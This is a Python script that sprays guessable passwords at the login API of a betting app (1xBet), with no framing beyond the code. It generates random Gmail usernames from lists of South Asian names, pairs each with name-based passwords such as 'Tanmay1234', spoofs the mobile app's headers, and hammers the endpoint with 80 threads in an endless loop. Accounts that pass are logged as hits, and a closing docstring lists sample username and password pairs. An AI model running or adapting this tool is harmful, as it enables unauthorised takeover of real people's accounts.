import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import sys

import random
from mahdix import *

done = []
fail = []

clear()
count=0
def login(user_name, passwordx):
    try:
        global count
        count+=1
        for password in passwordx:
            url = 'https://npimsxfbzha.com/UserAuth/Auth?v=5.0'
            headers = {
                'Host': 'npimsxfbzha.com',
                'x-tmsessionid': 'bb6e222e1bfab67479bf2904dfcfc2cb',
                'x-language': 'en',
                'x-whence': '22',
                'x-referral': '1',
                'x-group': '0',
                'x-bundleid': 'org.xbet.client1',
                'appguid': '1c1f0848992208cf_2',
                'x-fcountry': '19',
                'x-devicemanufacturer': 'OPPO',
                'x-devicemodel': 'CPH1931',
                'x-request-guid': '1_1c1f0848992208cf_2_1701787443122_30_-1010142795',
                'x-sign': 'N7lEADA0FFP5L1M1WAgFbEN803a6/9v5RllSNGbrLcBTEZH1dPvsfkH8miOkNUC32DO/DCfmTs/UrD84EWYHR8O3x7RW6rwSDrls+59XHdgLqpnnCQwy7D6FmfO1mnmzm46F2k5Je63MAUwbmAU9HiQmR0H3wLm4WvJCALVJi7+CF9NSBjuwuYE4Im9UWgQoEyoovTCDZ2sGob1+RWdIFofTPgYh0ML2WRUxJYK2M9+J71NC0c93HgIWaKejQE9lKKq4KeuCi35rYVZhITJBhfIwts5Ei8HQetzYtbfbcxKs89Jsw2r+94rxffvAc0uBfKBIRQA=_GrR9asip0rYJaT86uUSKhj8CRfccSQOJYV8UJpatmJ2QKfpMq+Rh8pnhlbdgcAfZNSon1K4jmdNQnlkPLG9Gn9oqzO/OCArru+tO1CmjnYwRw8TMC+V14Zgp8eoFFj6H7RUjNtG1fUlwwAuJmc4sqiSQOxqko1hRh6gvMWvvtIOUQFmS5RrF7MFtvkBYwt3BHAQIOJJ9vptQ==',
                'user-agent': 'xbet-agent',
                'version': '1xbet-prod-120(10055)',
                'accept-encoding': 'br,gzip',
                'content-type': 'application/json; charset=UTF-8',
                'content-length': '241',
            }
            import time as tm
            current_timestamp = str(int(tm.time()))
            data = {
                "Answer": "",
                "AppGuid": "1c1f0848992208cf_2",
                "Date": current_timestamp,
                "Language": "en",
                "Login": user_name+'@gmail.com',
                "OS": "Android",
                "OSVersion": "9",
                "Partner": 1,
                "Password": password,
                "QrCode": None,
                "Version": "1xBet v.120(10055)",
                "Whence": 22
            }
            response = requests.post(url, headers=headers, json=data)
            json_data = response.json()
            if 'Wrong Captcha' in json_data["Error"]:
                done.append(done)
                print(f'\r\r{LI_WHITE}[{len(done)}]{LI_GREEN}{user_name} | {password}')
            else:
                pass#print(json_data["Error"])
        fail.append('a')
        sys.stdout.write(f'\r\r[DONE] : {len(done)} [Fail] : {len(fail)}')
        sys.stdout.flush()
    except Exception as e:
        pass#print(f"Error: {e}")

fasts_names = [
    "Aarav", "Abir", "Adnan", "Afnan", "Ahan", "Ahmed", "Aiden", "Akash", "Alam", "Ali",
    "Aman", "Amin", "Anik", "Anis", "Arif", "Arman", "Asher", "Ashik", "Asif", "Ayman",
    "Aziz", "Bashar", "Bilal", "Bodhi", "Daud", "Ehsan", "Emran", "Fahim", "Farhan", "Firoz",
    "Faisal", "Fazal", "Hadi", "Hamza", "Hasan", "Imran", "Irfan", "Ismail", "Jamal", "Jihan",
    "Kazi", "Khalid", "Kamran", "Karim", "Kashif", "Mahir", "Mahmud", "Mamun", "Mansur",
    "Mashrur", "Mehedi", "Minhaj", "Miraz", "Mizan", "Mobarak", "Moin", "Monir", "Morshed", "Mot"
 "Aarav", "Abir", "Adnan", "Afnan", "Ahan", "Ahmed", "Aiden", "Akash", "Alam", "Ali",
    "Aman", "Amin", "Anik", "Anis", "Arif", "Arman", "Asher", "Ashik", "Asif", "Ayman",
    "Aziz", "Bashar", "Bilal", "Bodhi", "Daud", "Ehsan", "Emran", "Fahim", "Farhan", "Firoz",
    "Faisal", "Fazal", "Hadi", "Hamza", "Hasan", "Imran", "Irfan", "Ismail", "Jamal", "Jihan",
    "Kazi", "Khalid", "Kamran", "Karim", "Kashif", "Mahir", "Mahmud", "Mamun", "Mansur",
    "Mashrur", "Mehedi", "Minhaj", "Miraz", "Mizan", "Mobarak", "Moin", "Monir", "Morshed", "Mot",
    "Nabil", "Nafis", "Nashit", "Nashr", "Nawaf", "Nawaz", "Nazim", "Niaz", "Nihad", "Nihit",
    "Nirav", "Nirban", "Nirjon", "Nirupam", "Nishan", "Nisit", "Nivaan", "Nizam", "Noman", "Noor",
    "Nuha", "Omar", "Omer", "Oni", "Opurbo", "Ornob", "Ovin", "Ovy", "Owais", "Owji",
    "Pankaj", "Parag", "Paras", "Paritosh", "Parth", "Pranav", "Prasad", "Prashant", "Pritam", "Progya",
    "Qamar", "Qasim", "Qazi", "Quamrul", "Rabbi", "Rabiul", "Rafat", "Rafi", "Rafiq", "Rahat",
    "Rahul", "Raihan", "Raisul", "Rakib", "Rakshak", "Rakin", "Rakshit", "Rana", "Ranjan", "Rashad",
    "Rashid", "Ravish", "Rehan", "Reza", "Rezwan", "Riad", "Riaz", "Rifat", "Rifqi", "Rimon",
    "Ripon", "Rishan", "Rishav", "Rishi", "Riyad", "Rizwan", "Rohan", "Rokib", "Roky", "Romel",
    "Rony", "Ruhan", "Ruhul", "Ruksar", "Sabbir", "Sabeer", "Sabir", "Sabit", "Sabuj", "Sachin",
    "Sadiq", "Sadman", "Safal", "Safiq", "Sagar", "Sagor", "Sahil", "Sajal", "Sajid", "Sakib",
    "Sakil", "Sakir", "Salim", "Salman", "Sami", "Samir", "Samit", "Samrat", "Samuel", "Sanaul",
    "Sanjay", "Santo", "Sarfaraz", "Sarim", "Sarwar", "Saswata", "Sayed", "Shabbir", "Shafi", "Shah",
    "Shahid", "Shahin", "Shahriar", "Shahrukh", "Shahzad", "Shakil", "Shamim", "Shams", "Shamsul",
    "Shan", "Shantanu", "Sharif", "Shariq", "Shariyar", "Shashi", "Shawkat", "Shayon", "Shazid",
    "Shihab", "Shohel", "Shohid", "Shuvo", "Siam", "Siddiq", "Sifat", "Sijan", "Sikandar", "Simanto",
    "Sinan", "Siraj", "Siraz", "Siyam", "Sk", "Sohail", "Soham", "Sohan", "Sohel", "Solaiman",
    "Sourav", "Subhan", "Sudip", "Sufian", "Sujan", "Suman", "Sumit", "Sunil", "Sunny", "Supriyo",
    "Suraj", "Surya", "Suvro", "Swadhin", "Swapan", "Swarnadeep", "Syed", "Tajwar", "Talha", "Tanay",
    "Tanbir", "Tanim", "Tanish", "Tanishq", "Tanmay", "Tanvir", "Tariq", "Tasnim", "Tawhid", "Tayyab",
    "Tuhin", "Tuhin", "Tushar", "Udbhav", "Uddalok", "Uddin", "Uddipan", "Uddipta", "Uday", "Udbhav",
    "Udeep", "Udit", "Ujjal", "Ujwal", "Umar", "Upamanyu", "Upendra", "Upoma", "Urbashi", "Urmi",
    "Urmila", "Urooj", "Urvi", "Usama", "Usha", "Ushashi", "Ushasi", "Uzma", "Uzra", "Vaibhav",
    "Vandana", "Vanita", "Varun", "Vasudev", "Vasundhara", "Ved", "Vedant", "Veer", "Vibha", "Vibhuti",
    "Vidhi", "Vidur", "Vidyut", "Vidya", "Vijay", "Vijaya", "Vikas", "Vikram", "Vikrant", "Vimal",
    "Vinay", "Vinaya", "Vineet", "Vinod", "Vinayak", "Vinita", "Vipin", "Vipul", "Viral", "Virat",
    "Vishal", "Vishnu", "Vishwa", "Vivek", "Vrinda", "Vrindavan", "Vritti", "Vyas", "Vyom", "Wahid",
    "Waqar", "Wasim", "Wasiq", "Yadunandan", "Yaduvir", "Yash", "Yashas", "Yashasvi", "Yasin", "Yashraj",
    "Yusuf", "Zaheer", "Zaib", "Zaid", "Zain", "Zakir", "Zaki", "Zakir", "Zaman", "Zarif",
    "Zeeshan", "Zenith", "Zeeshan", "Zeeshan", "Zia", "Zishan", "Zohaib", "Zubair", "Zunaid", "Zyad"

]
_last_names = [
    "Ahmed", "Ali", "Bhuiyan", "Chowdhury", "Das", "Hossain", "Islam", "Khan", "Miah", "Rahman",
    "Sarker", "Uddin", "Mondal", "Choudhury", "Karmakar", "Biswas", "Siddiqui", "Karim", "Hasan", "Barman",
    "Chakraborty", "Roy", "Majumdar", "Banerjee", "Sen", "Ghosh", "Pal", "Bhowmick", "Gupta", "Dutta",
    "Biswas", "Ganguly", "Mitra", "Mondal", "Saha", "Majhi", "Majumder", "Mallick", "Naskar", "Sharma",
    "Biswas", "Chatterjee", "Mukherjee", "Paul", "Bera", "Giri", "Patra", "Shaw", "Dhar", "Nandi",
    "Bhattacharya", "Dutta", "Dey", "Nath", "Bairagi", "Gangopadhyay", "Banik", "Gorai", "Rai", "Ghatak",
    "Bhunia", "Sikder", "Bepari", "Mollick", "Sutradhar", "Dewan", "Barua", "Rana", "Biswas", "Acharya",
    "Rahman", "Ali", "Khan", "Ahmed", "Hasan", "Hossain", "Islam", "Chowdhury", "Haque", 
    "Ahmed", "Hussain", "Akhtar", "Khanam", "Begum", "Choudhury", "Akhter", "Uddin", "Chowdhury", 
    "Miah", "Sarker", "Mia", "Ahmed", "Siddique", "Hossain", "Parvin", "Akter", "Khan", 
    "Amin", "Alam", "Das", "Sultana", "Kabir", "Chowdhury", "Hoque", "Bashar", "Paul", 
    "Roy", "Dewan", "Shikder", "Saha", "Khatun", "Ahmed", "Dewan", "Sardar", "Biswas", 
    "Rahman", "Bepary", "Shil", "Laskar", "Akanda", "Sana", "Shaikh", "Sarder", "Sarkar", 
    "Sarker", "Rana", "Barman", "Baidya", "Saha", "Dey", "Nath", "Rani", "Gazi", 
    "Sha", "Dhar", "Nag", "Dutta", "Ray", "Mandal", "Goswami", "Banik", "Das", 
    "Karmakar", "Nath", "Gupta", "Bhuiyan", "Dasgupta", "Talukder", "Karim", "Dewan", "Mondal", 
    "Saha", "Sarker", "Sheikh", "Chakraborty", "Mandal", "Paul", "Biswas", "Barman", "Baidya", 
    "Roy", "Akanda", "Bepary", "Rani", "Sha", "Ray", "Nag", "Dey", "Sana", "Gazi"
]

with ThreadPool(max_workers=80) as ahare:
    while True:
        name = f'{random.choice(fasts_names)} {random.choice(_last_names)}'
        fast = name.split(' ')[0]
        mahdi_last = name.split(' ')[1]
        user_name = f"{random.choice(name.split(' ')).lower()}{random.randint(111, 9999)}"
        wx = [fast+'1@@', fast+'1234', fast+'123@', fast+'2233@@', fast+'123#@', fast+'123@', fast+'121##@@',
              mahdi_last+'1234', mahdi_last+'123@', mahdi_last+'2233@@', mahdi_last+'123#@', mahdi_last+'123@']
        ahare.submit(login, user_name, wx)
        
"""
[1]tanmay6999 | Tanmay1234
[2]tanmay6999 | Tanmay123@
[3]tanmay6999 | Tanmay2233@@
[4]tanmay6999 | Tanmay123#@
[5]tanmay6999 | Tanmay123@
[6]tanmay6999 | Tanmay121##@@
[7]tanmay6999 | Karmakar1234
[8]tanmay6999 | Karmakar123@
[9]tanmay6999 | Karmakar2233@@
[10]tanmay6999 | Karmakar123#@
[11]tanmay6999 | Karmakar123@

"""